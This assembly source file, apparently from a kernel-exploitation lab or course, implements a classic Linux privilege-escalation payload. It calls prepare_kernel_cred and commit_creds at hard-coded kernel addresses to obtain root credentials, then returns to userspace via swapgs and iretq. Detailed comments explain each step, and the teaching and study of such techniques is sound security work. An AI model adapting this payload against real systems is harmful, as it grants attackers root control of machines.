// obtained from System.map-1
.set prepare_kernel_cred, 0xffffffff810801c0
.set commit_creds, 0xffffffff81080320
.text
.global asm_exploit
asm_exploit:
	// call prepare_kernel_cred(NULL);
	// this will create a new ucred structure with root permissions
	movq $0, %rdi
	// we are not linked with the kernel, so we cannot just call
	// the function symbolic name and expect the linker to patch it.
	// Instead, we look up the function name in System.map-1 and
	// call it indirectly through a register.
	movabs $prepare_kernel_cred, %rax
	callq *%rax
	// the pointer to the ucred structure is now in %rax. We pass it
	// to the commits_creds() function, which will install it
	// in the current process, replacing the previous one.
	movq %rax, %rdi
	movabs $commit_creds, %rax
	callq *%rax
	// now we can return to userspace. We emulate the state of
	// the stack just after an interrupt from userspace and
	// then execute an IRETQ.
	pushq user_ss
	pushq user_stack_end
	pushq user_flags
	pushq user_cs
	// jump to cont() (defined in exploits.c)
	pushq $cont
	// swapgs copies the current contents of the GS register into an
	// internal CPU register (inaccessible from userpsace), and vice versa.
	// When the kernel was entered when we called write(), it executed
	// swapgs to get the kernel GS value from the internal register and
	// save the current (userspace) GS value into that same internal
	// register. On exit we must execute swapgs again, otherwise we will
	// crash the next time that we enter the kernel (since the kernel's
	// swapgs would then load the saved userspace GS value instead of the
	// kernel one).
	swapgs
	iretq

.global get_regs
get_regs:
	// CS and SS can be read with simple movw instructions (they are 16 bit
	// registers)
	movw %cs, user_cs
	movw %ss, user_ss
	// we can read the RFLAGS register by first pushing its contents
	// onto the stack and then popping them into our variable.
	pushfq
	popq user_flags
	ret

.global user_flags
.data
user_cs:	// the contents of the CS register
	.quad 0
user_ss:	// the contents of the SS register
	.quad 0
user_flags:	// the contents of the RFLAGS register
	.quad 0
// we also define a stack, to be used when we return from the kernel
.set USTACKSZ, 4096
// Pointer to the end of the stack. This will be the stack top when
// cont(), below, will be entered on return from the kernel. We subtract
// sizeof(unsigned long) (i.e., 8) to respect the ABI alignment on
// function enter (it must =0 (mod 16) just before the call, and therefore it is
// =8 (mod16) immediatly after).
user_stack_end:
	.quad user_stack + USTACKSZ - 8
.balign 16
user_stack:
	.space USTACKSZ
